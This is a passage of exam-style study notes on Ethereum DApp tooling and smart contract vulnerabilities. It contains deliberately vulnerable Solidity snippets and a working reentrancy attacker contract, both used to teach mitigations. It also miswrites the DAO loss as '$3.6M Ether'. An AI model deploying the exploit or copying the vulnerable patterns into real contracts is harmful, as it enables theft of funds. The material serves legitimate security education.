| **Data Ownership** | Corporate entity owns user data, profile records, and transaction histories. | Users retain complete self-sovereign control over digital assets and identities. |

---

#### 3. Part (b): Ethereum DApp Toolchain and Development Ecosystem

Building, testing, and deploying a production DApp requires a coordinated suite of development tools:

```
+------------------------------------------------------------------------+
|                        DAPP DEVELOPMENT TOOLCHAIN                      |
+------------------------------------------------------------------------+
|  1. LOCAL PROTOTYPING & DEBUGGING:  Remix IDE                         |
|  2. LOCAL DEVELOPMENT BLOCKCHAIN:   Ganache (Instant mining, 10 test accounts) |
|  3. COMPILATION & TESTING FRAMEWORK:Truffle Suite / Hardhat           |
|  4. KEY MANAGEMENT & SIGNING:       MetaMask Browser Extension         |
|  5. CLIENT-SIDE RPC INTEGRATION:    Web3.js / Ethers.js               |
|  6. DECENTRALIZED DATA STORAGE:     InterPlanetary File System (IPFS)  |
+------------------------------------------------------------------------+
```

1. **Remix IDE (Browser-Based Rapid Prototyping)**:
   * A powerful, browser-based development environment for authoring, compiling, and deploying Solidity smart contracts.
   * Features integrated static code analysis, real-time syntax checking, interactive execution debuggers, and an in-memory mock EVM runtime for rapid iteration.
2. **Truffle Suite & Hardhat (Enterprise Testing and Build Frameworks)**:
   * **Truffle**: Provides automated compilation pipelines, migration/deployment scripts, and Mocha/Chai testing suites for managing multi-contract deployments.
   * **Hardhat**: A modern development environment featuring native TypeScript support, fast compilation, detailed stack traces, and console logging (`console.log`) directly inside Solidity bytecode.
3. **Ganache (Local Deterministic Testnet)**:
   * A personal, local Ethereum blockchain simulator running on the developer's machine.
   * Pre-configures ten test accounts pre-funded with 100 mock Ether each, mines transactions instantly with zero latency, and provides comprehensive visibility into internal contract state mutations and gas usage.
4. **MetaMask (Non-Custodial Wallet & Key Management)**:
   * A secure browser extension and mobile wallet serving as the user's cryptographic identity manager.
   * Stores private keys securely in encrypted local storage, manages network connections (Mainnet, Sepolia testnet, local RPC), prompts users to sign transactions off-chain, and injects a global Web3 provider object (`window.ethereum`) into the browser context.
5. **Web3.js & Ethers.js (JavaScript Client Integration Libraries)**:
   * Abstract low-level JSON-RPC protocol calls into clean JavaScript/TypeScript APIs.
   * Transform raw contract ABIs into interactive JavaScript objects, allowing front-end applications to read state variables, construct transactions, estimate gas consumption, and listen for emitted events in real time.
6. **IPFS (InterPlanetary File System) & Swarm (Decentralized Storage)**:
   * Storing large media assets (e.g., PDF documents, high-resolution medical imaging, NFT artwork) directly on the EVM blockchain is cost-prohibitive due to storage gas fees.
   * DApps store large payloads off-chain in peer-to-peer content-addressed storage networks like IPFS. IPFS hashes files cryptographically into unique, immutable **Content Identifiers (CIDs)** (e.g., `QmXoypizjW3WknFiJnKLwHCnL72vedxjQkDDP1mXWo6uco`), which are then stored efficiently on-chain in smart contract state mappings.

---

### Question 5 (10 Marks):
**(a) Detail the Reentrancy Attack in smart contracts. Present a vulnerable contract code snippet, an attacker exploit contract, the execution sequence diagram (The DAO hack), and detail the two standard mitigation techniques: the Checks-Effects-Interactions (CEI) pattern and ReentrancyGuard.**  
**(b) Analyze other critical smart contract vulnerabilities: Integer Overflow and Underflow (SafeMath vs Solidity 0.8+), the `tx.origin` authentication flaw, Front-Running (Transaction-Ordering Dependence), and Denial of Service (DoS) attacks. Detail concrete prevention strategies for each.**

---

#### 1. Mumbai University Marking Scheme Rubric (10 Marks)

| Sub-Component | Evaluation Criteria | Allocated Marks |
| :--- | :--- | :--- |
| **Reentrancy Mechanism & DAO Exploit** | Explanation of state desynchronization, vulnerable withdrawal pattern, attacker fallback exploit contract, and ASCII execution flow. | **3 Marks** |
| **Reentrancy Mitigation Strategies** | Checks-Effects-Interactions (CEI) code rewrite and OpenZeppelin-style ReentrancyGuard mutex lock modifier implementation. | **2 Marks** |
| **Integer Overflow/Underflow & SafeMath**| Arithmetic boundary wrap-around, SafeMath library mechanism, and Solidity 0.8+ automatic checked arithmetic exceptions. | **1.5 Marks** |
| **tx.origin vs msg.sender Flaw** | Phishing attack vector using `tx.origin` in wallet contracts and mitigation using `msg.sender`. | **1.5 Marks** |
| **Front-Running & Denial of Service** | Mempool transaction ordering manipulation, Commit-Reveal mitigation, and Push vs Pull payment patterns for DoS prevention. | **2 Marks** |

---

#### 2. Part (a): Reentrancy Attack Mechanics, The DAO Exploit, and Mitigation

##### Vulnerability Mechanism
A **Reentrancy Attack** occurs when a vulnerable contract transfers native Ether to an external recipient address *before* updating its internal state balance records. If the receiving address is a malicious smart contract, the incoming transfer triggers the attacker's `receive()` or `fallback()` function.

Because execution control shifts to the attacker's contract, the attacker's fallback function can immediately call the vulnerable contract's withdrawal function again. Because the vulnerable contract has not yet updated the user's balance, the second withdrawal check passes, recursively draining funds until the contract's total reserve is depleted or execution runs out of gas.

This vulnerability was exploited in the historic **June 2016 DAO Hack**, resulting in the theft of $3.6\text{M Ether}$ and prompting the contentious Ethereum hard fork that split the network into Ethereum (ETH) and Ethereum Classic (ETC).

---

##### Vulnerable vs. Attacker Exploit Contract Code

###### 1. Vulnerable Bank Vault Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    // VULNERABILITY: External call occurs BEFORE state update!
    function withdraw() external {
        uint256 balance = userBalances[msg.sender];
        require(balance > 0, "Zero balance");

        // Vulnerable external call transfers Ether to msg.sender
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // CRITICAL FLAW: State updated too late! Never reached during reentrancy!
        userBalances[msg.sender] = 0;
    }
}
```

###### 2. Malicious Attacker Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackerExploit {
    IVulnerableBank public targetBank;
    address public owner;

    constructor(address _targetBank) {
        targetBank = IVulnerableBank(_targetBank);
        owner = msg.sender;
    }

    // Triggered upon receiving Ether from the bank's withdrawal call
    receive() external payable {
        if (address(targetBank).balance >= 1 ether) {
            // RE-ENTERING: Calls withdraw() again before bank sets balance to 0!
            targetBank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Requires >= 1 ETH");
        targetBank.deposit{value: 1 ether}();
        targetBank.withdraw(); // Initial trigger
    }
}
```

---

##### ASCII Execution Flow of the Reentrancy Loop

```
[ Attacker Contract ]                     [ VulnerableBank Contract ]
         |                                             |
         +--- 1. attack() deposits 1 ETH ------------->| balance[Attacker] = 1 ETH
         |                                             |
         +--- 2. Calls withdraw() -------------------->| Checks: balance >= 1 ETH (PASS)
         |                                             |
         |<-- 3. Sends 1 ETH to Attacker --------------+ (Execution hands over to Attacker)
         |       (Triggers receive() fallback)         |
         |                                             | [Balance NOT yet zeroed!]
         +--- 4. RE-ENTERING: Calls withdraw() ------->| Checks: balance >= 1 ETH (PASS!)
         |                                             |
         |<-- 5. Sends 1 ETH to Attacker --------------+ (Sends another 1 ETH!)
         |       (Triggers receive() fallback)         |
         |                                             |
         +--- 6. [Recursion continues until drained] ->|
         |                                             |
         |                                             | (Finally reaches balance update)
         |                                             | userBalances[Attacker] = 0;
```

---

##### Standard Mitigation Strategies

###### 1. The Checks-Effects-Interactions (CEI) Pattern
Always structure function operations in strict sequential order:
1. **Checks**: Validate all input parameters, permissions, and account balances first.
2. **Effects**: Update all internal contract state variables and balances *before* invoking any external calls.
3. **Interactions**: Perform external calls, ether transfers, or token interactions as the final step.

```solidity
function secureWithdraw() external {
    // 1. CHECKS
    uint256 balance = userBalances[msg.sender];
    require(balance > 0, "Zero balance");

    // 2. EFFECTS (State updated BEFORE external transfer!)
    userBalances[msg.sender] = 0;

    // 3. INTERACTIONS
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Transfer failed");
}
```

###### 2. ReentrancyGuard Mutex Lock Pattern
Use an OpenZeppelin-style binary mutex lock that sets an internal execution flag during function execution, reverting any reentrant calls:

```solidity
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;

    constructor() { _status = _NOT_ENTERED; }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}
```

---

#### 3. Part (b): Other Critical Smart Contract Vulnerabilities and Mitigations

```
+------------------------------------------------------------------------+
|               CRITICAL SMART CONTRACT VULNERABILITY TAXONOMY           |
+------------------------------------------------------------------------+
| 1. INTEGER OVERFLOW / UNDERFLOW ---> Arithmetic wrap-around            |
| 2. TX.ORIGIN PHISHING           ---> Authorization delegation bypass   |
| 3. FRONT-RUNNING / MEV          ---> Public mempool ordering theft     |
| 4. DENIAL OF SERVICE (DoS)      ---> Unexpected revert / gas exhaustion|
+------------------------------------------------------------------------+
```

##### 1. Integer Overflow and Underflow
* **Root Cause**: Unsigned integers have fixed bit widths. For `uint8`, the maximum capacity is $2^8 - 1 = 255$. In older Solidity versions ($<0.8.0$), incrementing $255 + 1$ silently wrapped around to $0$ without throwing an exception:
  $$\text{Overflow: } 255 + 1 \equiv 0 \pmod{256}, \quad \text{Underflow: } 0 - 1 \equiv 255 \pmod{256}$$
* **Historical Solution**: Developers imported OpenZeppelin's `SafeMath` library, which checked for overflows on every arithmetic operation.
* **Modern Prevention**: Since **Solidity 0.8.0**, the compiler includes default built-in overflow and underflow checks that automatically revert failing transactions with a `Panic(0x11)` error, making `SafeMath` redundant for basic arithmetic.

---

##### 2. The `tx.origin` Authentication Flaw
* **Root Cause**: `msg.sender` identifies the immediate caller of the current function call, whereas `tx.origin` traverses the call stack back to the original external user account that signed the transaction.
* **Phishing Attack Vector**:
  ```solidity
  // VULNERABLE: Uses tx.origin for authentication!
  function transferTo(address recipient, uint256 amount) external {
      require(tx.origin == owner, "Unauthorized");
      payable(recipient).transfer(amount);
  }
  ```
  If the owner interacts with a malicious contract, that contract can call the vulnerable wallet. Because the transaction originated with the owner (`tx.origin == owner`), the authorization check passes, allowing the attacker to drain wallet funds.
* **Prevention Strategy**: **Never use `tx.origin` for access control**. Always authenticate callers using `msg.sender`:
  ```solidity
  require(msg.sender == owner, "Unauthorized caller");
  ```

---

##### 3. Front-Running (Transaction-Ordering Dependence) & MEV
* **Root Cause**: Unconfirmed transactions sit in the public **Mempool** before being mined into a block. Malicious actors or searchers run automated bots that inspect pending transactions. If a profitable trade or puzzle solution is detected, the bot broadcasts an identical transaction with a higher priority gas fee, incentivizing validators to order the bot's transaction ahead of the original sender's.
* **Prevention Strategy**: Implement a two-phase **Commit-Reveal Scheme**:
  1. **Commit Phase**: The user submits a cryptographic hash of their selection paired with a secret salt:
     $$\text{Commitment} = \text{Keccak256}(\text{Choice} \parallel \text{SecretSalt})$$
     Mempool observers cannot read the choice due to hash pre-image resistance.
  2. **Reveal Phase**: In a subsequent round, the user reveals their plaintext choice and salt. The contract verifies that the hash matches the stored commitment before executing the outcome.

---

##### 4. Denial of Service (DoS) via Unexpected Revert / Gas Exhaustion
* **Root Cause (Push Payment Antipattern)**: Looping over an array of recipient addresses to distribute funds sequentially:
  ```solidity
  // VULNERABLE: Push Payment Antipattern
  for (uint256 i = 0; i < payees.length; i++) {
      payable(payees[i]).transfer(payoutAmount); // If ONE payee fails/reverts, ALL fail!
  }
  ```
  If one recipient is a contract whose fallback function explicitly reverts, the entire payout transaction fails, permanently locking vault funds.
* **Prevention Strategy (Pull Payment Pattern)**: Decouple transfers using a **Withdrawal / Pull Pattern**:
  * Instead of pushing funds to users, record their individual claimable balances in a mapping.
  * Require each user to call an individual `withdraw()` function independently, ensuring one user's failure cannot affect others.
